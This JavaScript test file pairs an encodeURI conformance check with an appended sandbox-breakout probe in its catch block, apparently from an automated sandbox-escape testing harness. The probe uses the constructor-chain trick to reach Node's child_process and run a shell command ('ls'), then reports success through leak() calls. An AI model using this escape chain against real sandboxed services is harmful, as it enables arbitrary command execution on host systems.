try {
    if (encodeURI('http://unipro.ru/\nabout') !== 'http://unipro.ru/%0Aabout' && encodeURI('http://unipro.ru/\nabout') !== 'http://unipro.ru/%0aabout') {
        $ERROR('#1: http://unipro.ru/\\nabout');
    }
    if (encodeURI('http://unipro.ru/\x0Babout') !== 'http://unipro.ru/%0Babout' && encodeURI('http://unipro.ru/\x0Babout') !== 'http://unipro.ru/%0babout') {
        $ERROR('#2: http://unipro.ru/\\vabout');
    }
    if (encodeURI('http://unipro.ru/\fabout') !== 'http://unipro.ru/%0Cabout' && encodeURI('http://unipro.ru/\fabout') !== 'http://unipro.ru/%0cabout') {
        $ERROR('#3: http://unipro.ru/\\fabout');
    }
    if (encodeURI('http://unipro.ru/\rabout') !== 'http://unipro.ru/%0Dabout' && encodeURI('http://unipro.ru/\rabout') !== 'http://unipro.ru/%0dabout') {
        $ERROR('#4: http://unipro.ru/\\rabout');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}